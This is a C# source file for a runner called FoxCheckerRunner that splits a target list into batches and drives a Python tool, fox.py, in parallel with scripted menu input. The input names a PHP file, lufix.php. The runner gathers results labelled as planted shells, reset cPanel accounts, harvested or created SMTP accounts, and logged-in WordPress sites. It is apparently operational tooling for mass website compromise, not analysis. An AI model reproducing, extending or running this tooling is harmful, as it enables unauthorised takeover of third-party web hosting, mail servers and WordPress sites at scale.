using Extensions;
using Newtonsoft.Json;
using System.Diagnostics;

namespace FoxCheckerRunner
{
    public class Program
    {
        private const string ShellsOutFilename = "/Results/Shells.txt";
        private const string CpanelsOutFilename = "/Results/cPanels_Reseted.txt";
        private const string SMTPsOutFilename = "/Results/SMTPs.txt";
        private const string SMTPsCreatedOutFilename = "/Results/SMTPs_Created.txt";
        private const string LoggedWordpressOutFilename = "/Results/Successfully_logged_WordPress.log";
        private const string AnswerPath = "/answer.json";
        private static int splitByCount = 2000;

        private static async Task Main()
        {
            Environment.CurrentDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
            string[] arguments = Environment.GetCommandLineArgs();
            string folderName;
            string filePath;

            if (arguments.Length < 3)
            {
                return;
            }

            folderName = arguments[1];
            filePath = arguments[2];
            if (arguments.Length > 3)
            {
                bool isOtherThreadCount = int.TryParse(arguments[3], out int inThreadCount);
                if (isOtherThreadCount)
                {
                    splitByCount = inThreadCount;
                }
            }
            bool showOutput = false;
            if (arguments.Length > 4)
            {
                showOutput = arguments[4] == "true";
            }

            try
            {
                JsonAnswer answer = new();
                List<string> mainList = new();
                if (File.Exists(filePath))
                {
                    using StreamReader reader = new(filePath);
                    string[] buffer = (await reader.ReadToEndAsync()).Split(Environment.NewLine).Where(s => !string.IsNullOrEmpty(s)).ToArray();
                    reader.Close();
                    mainList.AddRange(buffer);
                }

                List<string> shellsList = new();
                List<string> cpanelsList = new();
                List<string> smtpsList = new();
                List<string> loggedWordpressList = new();
                await CheckListAsync(mainList, folderName, shellsList, cpanelsList, smtpsList, loggedWordpressList);

                answer.Shells = await MakeFileFromListAsync(shellsList, folderName, "shells.txt");
                answer.CpanelsReseted = await MakeFileFromListAsync(cpanelsList, folderName, "cpanels_reseted.txt");
                answer.Smtps = await MakeFileFromListAsync(smtpsList, folderName, "smtps.txt");
                answer.LoggedWordpress = await MakeFileFromListAsync(loggedWordpressList, folderName, "logged_wordpress.txt");

                await WriteResultAsync(folderName + AnswerPath, JsonConvert.SerializeObject(answer));
            }
            catch (Exception ex)
            {
                await WriteResultAsync(folderName + AnswerPath, "{" + $"\"Error\":\"{ex.Message}\"" + "}");
            }

            if (showOutput)
            {
                Console.ReadKey();
            }
        }

        private static async Task WriteResultAsync(string filepath, string result)
        {
            using StreamWriter writer = new(filepath);
            await writer.WriteAsync(result);
            writer.Close();
        }

        private static async Task CheckListAsync(List<string> source, string mainFolderPath, List<string> shellsList, List<string> cpanelsList, List<string> smtpsList, List<string> loggedWordpressList)
        {
            int splitCount = source.Count / splitByCount;
            string checkerBinPath = Environment.CurrentDirectory + "/fox_bin/";

            List<List<string>> partitions = source.Partitions(splitCount);
            List<string> folderForCheck = new();
            foreach (List<string> part in partitions)
            {
                string partFolderPath = mainFolderPath + "/part" + partitions.IndexOf(part) + "/";
                Directory.CreateDirectory(partFolderPath);
                foreach (string file in Directory.GetFiles(checkerBinPath))
                {
                    FileInfo fi = new(file);
                    File.Copy(file, partFolderPath + fi.Name, true);
                }
                File.WriteAllLines(partFolderPath + "/input.txt", part);
                folderForCheck.Add(partFolderPath);
            }

            List<Task> waitingTasks = new();

            foreach (string folder in folderForCheck)
            {
                waitingTasks.Add(Task.Run(async () =>
                {
                    DirectoryInfo di = new(folder);
                    using StreamReader reader = new(di.FullName + "/input.txt");
                    string buffer = await reader.ReadToEndAsync();
                    int linesCount = buffer.Split(Environment.NewLine).Length;
                    reader.Close();

                    ProcessStartInfo psi = new()
                    {
                        FileName = "python.exe",
                        Arguments = "fox.py",
                        WorkingDirectory = folder,
                        RedirectStandardInput = true,
                        UseShellExecute = false
                    };
                    Process process = new()
                    {
                        StartInfo = psi
                    };
                    process.Start();

                    using StreamWriter writer = process.StandardInput;
                    await writer.WriteLineAsync("input.txt");
                    await writer.WriteLineAsync("29");
                    await writer.WriteLineAsync("3");
                    await writer.WriteLineAsync("lufix.php");
                    await writer.WriteLineAsync("Y");
                    await writer.WriteLineAsync();
                    writer.Close();

                    await Task.Delay(TimeSpan.FromSeconds(10));
                    process.WaitForExit(300000 * linesCount);
                    process.Kill();
                    await Task.Delay(TimeSpan.FromSeconds(2));

                    if (File.Exists(folder + ShellsOutFilename))
                    {
                        string[] lines = File.ReadAllLines(folder + ShellsOutFilename);
                        shellsList.AddRange(lines);
                    }
                    if (File.Exists(folder + CpanelsOutFilename))
                    {
                        string[] lines = File.ReadAllLines(folder + CpanelsOutFilename);
                        cpanelsList.AddRange(lines);
                    }
                    if (File.Exists(folder + SMTPsOutFilename))
                    {
                        string[] lines = File.ReadAllLines(folder + SMTPsOutFilename);
                        smtpsList.AddRange(lines);
                    }
                    if (File.Exists(folder + SMTPsCreatedOutFilename))
                    {
                        string[] lines = File.ReadAllLines(folder + SMTPsCreatedOutFilename);
                        smtpsList.AddRange(lines);
                    }
                    if (File.Exists(folder + LoggedWordpressOutFilename))
                    {
                        string[] lines = File.ReadAllLines(folder + LoggedWordpressOutFilename);
                        loggedWordpressList.AddRange(lines);
                    }
                    Directory.Delete(folder, true);
                }));
            }
            await Task.WhenAll(waitingTasks);
        }

        private static async Task<string> MakeFileFromListAsync(List<string> list, string foldername, string filename)
        {
            if (list.Any())
            {
                string filePath = foldername + "/" + filename;
                using TextWriter writer = new StreamWriter(filePath);
                foreach (var line in list)
                {
                    await writer.WriteLineAsync(line);
                }
                writer.Close();
                return filePath.Replace("\\", "/").Remove(2, 1).Insert(2, "\\");
            }
            else
            {
                return "";
            }
        }

        public class JsonAnswer
        {
            public string Shells { get; set; }
            public string CpanelsReseted { get; set; }
            public string Smtps { get; set; }
            public string LoggedWordpress { get; set; }
        }
    }
}